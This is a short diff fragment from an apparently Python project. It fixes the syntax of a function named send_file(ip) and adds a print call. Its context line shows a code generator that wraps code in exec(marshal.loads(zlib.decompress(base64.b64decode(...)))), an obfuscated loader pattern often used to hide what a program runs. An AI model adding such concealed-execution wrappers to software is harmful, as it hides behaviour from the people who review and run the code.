@@ -188,4 +188,5 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
     
 
 
-    def send_file(ip)
+    def send_file(ip):
+        print(ip)
